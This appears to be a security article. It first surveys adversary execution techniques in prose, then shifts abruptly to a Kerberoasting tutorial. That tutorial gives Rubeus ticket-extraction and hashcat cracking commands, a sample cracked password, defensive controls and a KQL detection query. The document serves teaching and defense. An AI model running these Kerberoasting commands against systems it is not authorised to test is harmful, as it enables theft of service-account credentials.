User Execution

Many execution events rely on some level of user interaction. Adversaries frequently design lures that convince a victim to open a malicious document, click a link, or run a file. These actions trigger embedded macros, scripts, or exploits that execute code in the user’s context. The reliance on user execution introduces variability, so attackers invest heavily in social engineering to increase success rates. Once triggered, the execution chain may silently download additional payloads, modify system settings, or establish persistence mechanisms without further user awareness.

Exploitation for Client Execution

Execution can also occur through direct exploitation of vulnerabilities in client-side applications such as web browsers, document viewers, or email clients. In this scenario, the user does not need to explicitly run code; simply viewing malicious content is sufficient. Attackers leverage memory corruption flaws, logic bugs, or sandbox escapes to execute arbitrary code within the context of the vulnerable application. This method is particularly effective because it bypasses user suspicion and often evades traditional security controls that rely on detecting explicit execution events.

Inter-Process-Communications Abuse

Adversaries frequently exploit legitimate inter-process communication (IPC) mechanisms to execute code indirectly. Instead of launching a new process in a suspicious way, they inject commands or payloads into existing processes. Techniques such as Dynamic Data Exchange (DDE), named pipes, or COM objects allow attackers to leverage trusted processes as execution proxies. This approach reduces visibility because the activity appears to originate from legitimate system components rather than a clearly malicious binary.

Scheduled Task and Job Execution

Execution may be deferred or automated through scheduled tasks, cron jobs, or other job scheduling mechanisms. While often associated with persistence, these techniques also serve as initial execution vectors. For example, an attacker may create a scheduled task that runs a payload at system startup or at a specific time. This allows execution to occur outside the initial compromise window, complicating forensic timelines and making detection more difficult.

Service Execution

Services provide another reliable method for executing code, particularly in environments where administrative privileges have been obtained. Attackers can create or modify system services to run malicious binaries under the guise of legitimate system operations. Because services often run with elevated privileges and are expected to execute continuously, they offer a stable and stealthy execution mechanism. This technique is especially common in post-exploitation phases where maintaining control and stability is critical.

API and System Call Invocation

Rather than relying solely on high-level scripting or command interpreters, sophisticated adversaries may execute code by directly invoking system APIs or low-level system calls. This allows them to bypass traditional monitoring mechanisms that focus on command-line activity. By embedding execution logic within compiled binaries or shellcode, attackers can interact directly with the operating system, making their actions harder to trace and attribute.

Fileless and In-Memory Execution

Modern adversaries increasingly favor fileless execution techniques, where code runs entirely in memory without touching disk. This is often achieved through PowerShell, reflective DLL injection, or shellcode loaders. By avoiding disk artifacts, attackers reduce their forensic footprint and evade signature-based detection systems. In-memory execution is frequently combined with other techniques, such as process injection, to further obscure the origin and intent of the activity.

Living-Off-The-Land (LOTL) Techniques

Execution often leverages legitimate system utilities, commonly referred to as “living-off-the-land binaries” (LOLBins). Tools such as PowerShell, wmic, mshta, or rundll32 can be repurposed to execute malicious code while appearing benign. This approach minimizes the need for custom malware and exploits the trust placed in native system tools. As a result, distinguishing malicious execution from legitimate administrative activity becomes significantly more challenging.

Execution Chain Orchestration

Execution rarely occurs as a single isolated event. Instead, it is part of a broader chain that may involve multiple stages, each responsible for a specific function. An initial script may download a second-stage payload, which then injects into a process, which in turn establishes persistence and communication with command-and-control infrastructure. This layered approach allows adversaries to adapt dynamically, replace components as needed, and maintain resilience against partial detection or disruption.

Defensive Considerations and Detection Challenges

From a defensive perspective, the execution phase is one of the most critical points for detection and response; however, it is also one of the most challenging to monitor effectively. The widespread use of legitimate tools, in-memory techniques, and indirect execution paths creates significant noise and ambiguity. Effective detection requires a combination of behavioral analysis, command-line auditing, process monitoring, and anomaly detection. Defenders must focus not only on what is executed, but how, when, and in what context, correlating execution events with preceding and subsequent activity to build a complete picture of adversary behavior.

Kerberoasting requires only a valid domain user account — no elevated privileges are needed to request service tickets, making it a low-barrier, high-impact attack.

Extract Tickets with Rubeus

Rubeus is a C# toolset for Kerberos interaction and abuse. It can request and extract service tickets in a crackable format:

cmd 
# Request tickets for all kerberoastable accounts
Rubeus.exe kerberoast /outfile:hashes.txt

# Target a specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/db01.corp.local:1433

# Use RC4 downgrade for easier cracking (noisier)
Rubeus.exe kerberoast /tgtdeleg

Crack with Hashcat

bash 
# Crack Kerberos 5 TGS-REP (RC4 - type 23)
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# Crack AES256 tickets (type 17/18 — slower)
hashcat -m 19700 hashes.txt wordlist.txt --force

# Check results
hashcat -m 13100 hashes.txt --show
$krb5tgs$23$*svc_sql$CORP.LOCAL*$...:Summer2024!
⚠️
Legal Notice: Only perform Kerberoasting attacks against systems you are authorized to test. Unauthorized access to computer systems is a criminal offense under laws such as the CFAA (US) and Computer Misuse Act (UK).

Detection & Defense

Defending against Kerberoasting requires a multi-layered approach combining preventive controls and detection mechanisms:

Preventive Controls

  • Strong service account passwords: Use 25+ character randomly generated passwords for all service accounts with SPNs
  • Group Managed Service Accounts (gMSA): Automatically rotate 240-character complex passwords every 30 days
  • AES encryption only: Disable RC4_HMAC_MD5 via GPO to force AES256, making cracking computationally expensive
  • Minimize SPNs: Audit and remove unnecessary SPNs from user accounts; use computer accounts where possible
  • Privileged Access Management: Avoid assigning Domain Admin or high-privilege group memberships to service accounts
KQL (Microsoft Sentinel) 
// Detect potential Kerberoasting via RC4 TGS requests
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"   // RC4
| where ServiceName !endswith "$"         // Exclude machine accounts
| summarize Count=count() by TargetUserName, IpAddress, bin(TimeGenerated, 5m)
| where Count > 5
